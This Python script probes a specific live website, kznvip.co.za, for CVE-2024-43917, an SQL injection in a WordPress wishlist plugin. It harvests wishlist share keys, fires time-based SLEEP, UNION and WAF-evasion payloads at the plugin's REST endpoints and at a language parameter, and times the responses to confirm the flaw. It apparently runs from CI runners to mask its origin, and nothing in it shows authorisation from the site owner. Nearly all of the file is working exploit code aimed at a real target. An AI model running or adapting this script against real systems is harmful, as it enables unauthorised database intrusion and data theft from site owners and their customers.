#!/usr/bin/env python3
"""kznvip TI Wishlist CVE-2024-43917 timing/union SQLi probe (clean GHA egress)."""
import json, time, uuid, re, urllib.request, urllib.parse, statistics
from pathlib import Path

TARGET = "https://kznvip.co.za"
OUT = Path("artifacts")
OUT.mkdir(exist_ok=True)
# also mirror to out/ for older workflow path
Path("out").mkdir(exist_ok=True)
results = {"ts": time.time(), "tests": []}

KNOWN_SHARES = ["bfa79e", "a4bc53", "e6b382", "c631be", "534e24"]


def http(method, url, data=None, headers=None, timeout=90):
    h = {"User-Agent": "Mozilla/5.0 lurksek-gha", "Accept": "*/*"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=data, headers=h, method=method)
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = r.read()
            return r.status, time.time() - t0, body, dict(r.headers)
    except Exception as e:
        return 0, time.time() - t0, str(e).encode(), {}


# --- create wishlist / extract share key ---
boundary = "----GHA" + uuid.uuid4().hex[:12]
share = None
for pid in list(range(1, 80)) + [6130, 9000, 9139]:
    parts = []
    for k, v in [("tinv_wishlist_id", ""), ("product_id", str(pid)), ("product_action", "addto")]:
        parts.append(
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n".encode()
        )
    parts.append(f"--{boundary}--\r\n".encode())
    body = b"".join(parts)
    code, t, resp, _ = http(
        "POST",
        TARGET + "/",
        data=body,
        headers={
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "X-Requested-With": "XMLHttpRequest",
            "Accept": "application/json",
        },
        timeout=40,
    )
    text = resp.decode("utf-8", "replace")
    m = re.search(r"kznvip\.co\.za\\?/([a-f0-9]{6})", text)
    if m:
        share = m.group(1)
        results["share_key"] = share
        results["share_from_pid"] = pid
        results["share_resp"] = text[:500]
        print("SHARE", share, "pid", pid)
        break
    if "share_key" in text:
        m2 = re.search(r'"share_key"\s*:\s*"([A-Za-z0-9]+)"', text)
        if m2:
            share = m2.group(1)
            results["share_key"] = share
            print("SHARE", share)
            break

if not share:
    share = KNOWN_SHARES[0]
    results["share_key"] = share
    results["share_fallback"] = True
    print("SHARE_FALLBACK", share)

# Prefer a share that already has products, if any
populated = []
for sk in [share] + [s for s in KNOWN_SHARES if s != share]:
    code, t, body, _ = http("GET", f"{TARGET}/wp-json/wc/v3/wishlist/{sk}/get_products?count=100", timeout=40)
    text = body.decode("utf-8", "replace")
    try:
        arr = json.loads(text)
        n = len(arr) if isinstance(arr, list) else -1
    except Exception:
        n = -1
        arr = None
    print(f"PRODUCTS {sk} code={code} n={n} t={t:.2f}")
    results.setdefault("product_checks", []).append({"share": sk, "code": code, "n": n, "time": round(t, 3)})
    if n and n > 0:
        populated.append(sk)
        share = sk
        break

results["share_key"] = share
results["populated_shares"] = populated


def rest_order(order):
    q = urllib.parse.urlencode({"count": 10, "offset": 0, "order": order})
    url = f"{TARGET}/wp-json/wc/v3/wishlist/{share}/get_products?{q}"
    return http("GET", url, timeout=120)


def msf_order(order):
    q = urllib.parse.urlencode({"_method": "GET", "order": order, "count": 10, "offset": 0})
    url = f"{TARGET}/?{q}"
    data = f"rest_route=/wc/v3/wishlist/{share}/get_products".encode()
    return http(
        "POST",
        url,
        data=data,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=120,
    )


suite = []
payloads = [
    ("ASC1", "ASC", rest_order),
    ("ASC2", "ASC", rest_order),
    ("ASC3", "ASC", rest_order),
    ("S5a", ",(SELECT SLEEP(5))--", rest_order),
    ("S5b", ",(SELECT SLEEP(5))--", rest_order),
    ("S10a", ",(SELECT SLEEP(10))--", rest_order),
    ("S10b", ",(SELECT SLEEP(10))--", rest_order),
    ("ASC4", "ASC", rest_order),
    ("M_ASC", "ASC", msf_order),
    ("M_S5", ",(SELECT SLEEP(5))--", msf_order),
    ("M_S10", ",(SELECT SLEEP(10))--", msf_order),
    # empty-set UNION bypass (10 cols)
    ("U5", "DESC LIMIT 0 UNION SELECT SLEEP(5),2,3,4,5,6,7,8,9,10-- ", msf_order),
    ("U5b", "DESC LIMIT 0 UNION SELECT SLEEP(5),2,3,4,5,6,7,8,9,10-- ", msf_order),
    ("U10", "DESC LIMIT 0 UNION SELECT SLEEP(10),2,3,4,5,6,7,8,9,10-- ", msf_order),
    ("U5n", "DESC LIMIT 0 UNION SELECT SLEEP(5),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ", msf_order),
    # WAF evasion
    ("C5", ",(SEL/**/ECT/**/SLEEP/**/(5))--", msf_order),
    ("C10", ",(SEL/**/ECT/**/SLEEP/**/(10))--", msf_order),
    ("V5", ",/*!50000SELECT*/ /*!50000SLEEP*/(5)--", msf_order),
    ("V10", ",/*!50000SELECT*/ /*!50000SLEEP*/(10)--", msf_order),
    ("K5", ",(SeLeCt SlEeP(5))--", msf_order),
    ("K10", ",(SeLeCt SlEeP(10))--", msf_order),
    ("ASC5", "ASC", msf_order),
]

for label, order, fn in payloads:
    code, t, body, _ = fn(order)
    entry = {
        "label": label,
        "order": order,
        "code": code,
        "time": round(t, 3),
        "body": body[:120].decode("utf-8", "replace"),
    }
    suite.append(entry)
    print(f"{label:6s} code={code} t={t:6.2f} {body[:40]!r}")

results["suite"] = suite

asc = [x["time"] for x in suite if x["label"].startswith("ASC") and x["code"] == 200]
s5 = [x["time"] for x in suite if x["label"] in ("S5a", "S5b", "M_S5") and x["code"] == 200]
s10 = [x["time"] for x in suite if x["label"] in ("S10a", "S10b", "M_S10") and x["code"] == 200]
u5 = [x["time"] for x in suite if x["label"] in ("U5", "U5b", "U5n") and x["code"] == 200]
u10 = [x["time"] for x in suite if x["label"] == "U10" and x["code"] == 200]
c5 = [x["time"] for x in suite if x["label"] in ("C5", "V5", "K5") and x["code"] == 200]
c10 = [x["time"] for x in suite if x["label"] in ("C10", "V10", "K10") and x["code"] == 200]

confirmed = False
reason = ""
if asc:
    a = statistics.median(asc)

    def ok_pair(slow5, slow10, tag):
        global confirmed, reason
        if slow5 and slow10 and all(t >= a + 3.5 for t in slow5) and all(t >= a + 8 for t in slow10):
            confirmed = True
            reason = f"{tag}: median ASC={a:.2f} S5={slow5} S10={slow10}"

    ok_pair(s5, s10, "plain")
    if not confirmed:
        ok_pair(u5, u10, "union")
    if not confirmed:
        ok_pair(c5, c10, "evasion")

results["confirmed"] = confirmed
results["reason"] = reason
results["medians"] = {
    "asc": statistics.median(asc) if asc else None,
    "s5": statistics.median(s5) if s5 else None,
    "s10": statistics.median(s10) if s10 else None,
    "u5": statistics.median(u5) if u5 else None,
    "u10": statistics.median(u10) if u10 else None,
}

# Case Two lang probe (WPML JOIN) via addto
boundary2 = "----GHA" + uuid.uuid4().hex[:8]
case2 = []
for lab, lang in [
    ("L_ASC", "en"),
    ("L_S5", "en' AND SLEEP(5) AND '1"),
    ("L_S10", "en' AND SLEEP(10) AND '1"),
    ("L_ASC2", "en"),
]:
    parts = []
    for k, v in [
        ("tinv_wishlist_id", ""),
        ("product_id", "1"),
        ("product_action", "addto"),
        ("lang", lang),
        ("lang_default", "en"),
    ]:
        parts.append(
            f"--{boundary2}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n".encode()
        )
    parts.append(f"--{boundary2}--\r\n".encode())
    code, t, body, _ = http(
        "POST",
        TARGET + "/",
        data=b"".join(parts),
        headers={"Content-Type": f"multipart/form-data; boundary={boundary2}"},
        timeout=90,
    )
    case2.append({"label": lab, "lang": lang, "code": code, "time": round(t, 3), "body": body[:80].decode("utf-8", "replace")})
    print(f"{lab:6s} code={code} t={t:6.2f}")

results["case2"] = case2
lb = [x["time"] for x in case2 if x["label"].startswith("L_ASC") and x["code"] == 200]
ls5 = [x["time"] for x in case2 if x["label"] == "L_S5" and x["code"] == 200]
ls10 = [x["time"] for x in case2 if x["label"] == "L_S10" and x["code"] == 200]
if lb and ls5 and ls10:
    a = statistics.median(lb)
    if all(t >= a + 3.5 for t in ls5) and all(t >= a + 8 for t in ls10):
        confirmed = True
        reason = f"case2_lang: ASC={a:.2f} S5={ls5} S10={ls10}"
        results["confirmed"] = True
        results["reason"] = reason

for p in (OUT / "results.json", Path("out/results.json")):
    p.write_text(json.dumps(results, indent=2))
print("CONFIRMED" if confirmed else "NOT_CONFIRMED", reason)
print("SUMMARY", json.dumps(results.get("medians"), indent=2))
